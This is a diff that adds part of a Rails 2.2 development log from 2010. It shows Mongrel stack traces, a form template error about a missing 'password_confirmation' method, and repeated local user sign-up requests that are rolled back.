+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:132:in `dispatch_cgi'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:39:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:76:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:74:in `synchronize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/rails.rb:74:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:159:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:282:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/command.rb:212:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load_without_new_constant_marking'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/servers/mongrel.rb:64
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/server.rb:49
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    script/server:3
+
+Rendered /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/_trace (98.8ms)
+Rendered /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/_request_and_response (1.0ms)
+Rendering /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/layout.erb (internal_server_error)
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-12-01 21:14:25) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 14ms (View: 7, DB: 1) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:14:43) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"r", "password"=>"g", "email"=>"cr@x.com", "first_name"=>"c"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.6ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 101ms (View: 5, DB: 2) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-12-01 21:22:24) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.9ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+
+
+ActionView::TemplateError (undefined method `password_confirmation' for #<User:0x103a1fa78>) on line #33 of app/views/users/new.html.erb:
+30: 		</tr>
+31: 		<tr>
+32: 			<td class="label">Confirm Password:</td>
+33: 			<td><%= password_field('user', 'password_confirmation', :size => 14) %></td>
+34: 		</tr>		
+35: 		<tr>
+36: 			<td class="label">Zip Code:</td>
+
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/attribute_methods.rb:260:in `method_missing'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/form_helper.rb:653:in `send'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/form_helper.rb:653:in `value_before_type_cast'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/form_helper.rb:641:in `value_before_type_cast'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/form_helper.rb:560:in `to_input_field_tag'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/form_helper.rb:376:in `password_field'
+    app/views/users/new.html.erb:33
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/capture_helper.rb:36:in `call'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/capture_helper.rb:36:in `capture'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/capture_helper.rb:129:in `with_output_buffer'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/capture_helper.rb:36:in `capture'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/form_tag_helper.rb:460:in `form_tag_in_block'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/helpers/form_tag_helper.rb:39:in `form_tag'
+    app/views/users/new.html.erb:7
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/renderable.rb:39:in `send'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/renderable.rb:39:in `render'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/template.rb:73:in `render_template'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/base.rb:256:in `render'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/base.rb:367:in `_render_with_layout'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_view/base.rb:254:in `render'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:1174:in `render_for_file'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:896:in `render_without_benchmark'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:51:in `render'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/core_ext/benchmark.rb:8:in `realtime'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:51:in `render'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:868:in `render_without_benchmark'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:51:in `render'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/core_ext/benchmark.rb:8:in `realtime'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:51:in `render'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:1248:in `default_render'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:1254:in `perform_action_without_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:617:in `call_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:610:in `perform_action_without_benchmark'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:68:in `perform_action_without_rescue'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/1.8/benchmark.rb:293:in `measure'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/benchmarking.rb:68:in `perform_action_without_rescue'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/rescue.rb:136:in `perform_action_without_caching'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/caching/sql_cache.rb:13:in `perform_action'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/connection_adapters/abstract/query_cache.rb:34:in `cache'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activerecord-2.2.2/lib/active_record/query_cache.rb:8:in `cache'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/caching/sql_cache.rb:12:in `perform_action'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:524:in `send'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:524:in `process_without_filters'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/filters.rb:606:in `process_without_session_management_support'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/session_management.rb:134:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/base.rb:392:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:183:in `handle_request'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:110:in `dispatch_unlocked'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:123:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `synchronize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:122:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:132:in `dispatch_cgi'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/dispatcher.rb:39:in `dispatch'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/rails.rb:76:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/rails.rb:74:in `synchronize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/rails.rb:74:in `process'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:159:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:158:in `process_client'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:285:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `initialize'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `new'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel.rb:268:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:282:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `each'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/configurator.rb:281:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/lib/mongrel/command.rb:212:in `run'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load_without_new_constant_marking'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:142:in `load'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/servers/mongrel.rb:64
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:521:in `new_constants_in'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/activesupport-2.2.2/lib/active_support/dependencies.rb:153:in `require'
+    /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/rails-2.2.2/lib/commands/server.rb:49
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `gem_original_require'
+    /Library/Ruby/Site/1.8/rubygems/custom_require.rb:31:in `require'
+    script/server:3
+
+Rendered /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/_trace (53.0ms)
+Rendered /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/_request_and_response (0.8ms)
+Rendering /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/gems/1.8/gems/actionpack-2.2.2/lib/action_controller/templates/rescues/layout.erb (internal_server_error)
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-12-01 21:38:04) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 13ms (View: 7, DB: 1) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:38:19) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"j", "password"=>"g", "email"=>"j@x.com", "first_name"=>"j"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.3ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (188.2ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.3ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 272ms (View: 5, DB: 190) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-12-01 21:39:24) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (548.6ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 580ms (View: 26, DB: 549) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:39:40) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"d", "password"=>"g", "email"=>"j@x.com", "first_name"=>"d"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (12.9ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.3ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.4ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 96ms (View: 5, DB: 14) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:39:53) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"d", "password"=>"g", "email"=>"j@x.com", "first_name"=>"d"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 17ms (View: 6, DB: 2) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:39:56) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"d", "password"=>"", "email"=>"j@x.com", "first_name"=>"d"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.5ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (1.0ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.2ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 19ms (View: 6, DB: 3) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:40:02) [POST]
+  Parameters: {"commit"=>"Create", "authenticity_token"=>"89974400cce4021fa78a307b1737e5ce6315d296", "user"=>{"zip_code"=>"20148", "password_confirmation"=>"g", "username"=>"cragan", "last_name"=>"d", "password"=>"g", "email"=>"j@x.com", "first_name"=>"d"}}
+  [4;35;1mSQL (0.1ms)[0m   [0mSET NAMES 'utf8'[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET SQL_AUTO_IS_NULL=0[0m
+  [4;35;1mUser Columns (1.2ms)[0m   [0mSHOW FIELDS FROM `users`[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mBEGIN[0m
+  [4;35;1mUser Exists (0.8ms)[0m   [0mSELECT `users`.id FROM `users` WHERE (`users`.`username` = BINARY 'cragan') LIMIT 1[0m
+  [4;36;1mSQL (0.1ms)[0m   [0;1mROLLBACK[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 79ms (View: 67, DB: 2) | 200 OK [http://localhost/users]
+
+
+Processing UsersController#new (for 127.0.0.1 at 2010-12-01 21:40:51) [GET]
+  [4;36;1mSQL (0.1ms)[0m   [0;1mSET NAMES 'utf8'[0m
+  [4;35;1mSQL (0.1ms)[0m   [0mSET SQL_AUTO_IS_NULL=0[0m
+  [4;36;1mUser Columns (1.2ms)[0m   [0;1mSHOW FIELDS FROM `users`[0m
+Rendering template within layouts/application
+Rendering users/new
+Completed in 14ms (View: 7, DB: 1) | 200 OK [http://localhost/users/new]
+
+
+Processing UsersController#create (for 127.0.0.1 at 2010-12-01 21:41:12) [POST]
